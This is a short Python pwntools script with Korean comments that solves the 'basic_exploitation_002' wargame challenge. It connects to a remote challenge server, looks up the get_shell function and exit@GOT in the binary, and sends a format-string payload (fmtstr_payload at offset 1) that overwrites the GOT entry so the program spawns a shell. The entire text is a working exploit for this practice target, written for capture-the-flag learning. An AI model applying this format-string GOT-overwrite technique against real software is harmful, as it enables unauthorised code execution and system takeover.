from pwn import *

# 1. 연결 설정
# 로컬 바이너리가 있다면 './basic_exploitation_002'로 설정하여 분석 정보를 가져옵니다.
# 실제 공격은 remote로 수행합니다.
p = remote('host3.dreamhack.games', 19853)
elf = ELF('./basic_exploitation_002')

# 2. 주소 정보 수집
get_shell_addr = elf.symbols['get_shell'] # 우리가 실행하고 싶은 함수
exit_got = elf.got['exit']                # 덮어쓸 타겟 함수 (GOT)

print(f"Target Address (get_shell): {hex(get_shell_addr)}")
print(f"Overwrite Location (exit@got): {hex(exit_got)}")

# 3. 페이로드 생성 (Format String Bug Exploitation)
# fmtstr_payload(오프셋, {덮어쓸주소: 넣을값})
# 이 문제에서 buf는 printf의 1번째 인자 위치에 있으므로 offset은 1입니다.
# exit_got 주소에 get_shell_addr 값을 쓰라는 페이로드를 자동으로 만듭니다.
payload = fmtstr_payload(1, {exit_got: get_shell_addr})

# 4. 페이로드 전송
p.send(payload)

# 5. 셸 획득 및 플래그 확인
p.interactive()